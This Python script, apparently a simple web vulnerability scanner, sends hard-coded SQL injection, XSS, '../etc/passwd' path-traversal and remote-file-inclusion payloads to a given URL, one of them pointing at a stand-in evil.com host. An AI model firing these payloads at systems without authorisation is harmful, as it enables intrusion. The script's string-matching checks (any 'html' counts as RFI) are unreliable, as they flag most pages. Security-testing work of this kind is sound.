import argparse
import requests

# Common payloads for different vulnerabilities
payloads = {
    'sqli': ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"],
    'xss': ['<script>alert("XSS")</script>', '<img src="x" onerror="alert(\'XSS\')">'],
    'lfi': ['../etc/passwd', '../../etc/passwd', '../../../../etc/passwd'],
    'rfi': ['http://example.com/malicious_file.txt', 'http://evil.com/malicious_file.php']
}

class VulnerabilityScanner:
    def __init__(self, url):
        self.url = url

    def scan(self):
        for vuln_type, payload_list in payloads.items():
            for payload in payload_list:
                target_url = f"{self.url}{payload}"
                try:
                    response = requests.get(target_url)
                    if self.is_vulnerable(vuln_type, response):
                        print(f"[+] Possible {vuln_type.upper()} vulnerability found: {target_url}")
                except requests.RequestException as e:
                    print(f"[-] Error: {e}")

    def is_vulnerable(self, vuln_type, response):
        if vuln_type == 'sqli':
            return "error" in response.text.lower() or "sql" in response.text.lower()
        elif vuln_type == 'xss':
            return '<script>' in response.text.lower() or 'alert(' in response.text.lower()
        elif vuln_type == 'lfi':
            return 'root:' in response.text.lower() or 'bin:' in response.text.lower()
        elif vuln_type == 'rfi':
            return 'php' in response.text.lower() or 'html' in response.text.lower()
        return False

def main():
    parser = argparse.ArgumentParser(description='Vulnerability Scanner')
    parser.add_argument('url', type=str, help='Base URL of the website to scan, with a parameter placeholder')
    args = parser.parse_args()

    scanner = VulnerabilityScanner(args.url)
    scanner.scan()

if __name__ == '__main__':
    main()